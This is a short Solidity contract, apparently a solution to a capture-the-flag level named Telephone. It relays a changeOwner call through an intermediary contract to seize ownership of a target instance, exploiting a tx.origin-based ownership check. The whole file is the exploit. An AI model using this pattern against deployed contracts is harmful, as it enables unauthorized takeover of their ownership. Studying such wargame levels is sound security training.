// SPDX-License-Identifier: MIT
pragma solidity ^0.6.5;

interface Telephone {
    function changeOwner(address _owner) external ;
}


contract TelephoneHack {

   

    function hack(address _owner, address _instanceAddr) public {
         Telephone telephone = Telephone(_instanceAddr);
        telephone.changeOwner(_owner);
    }
}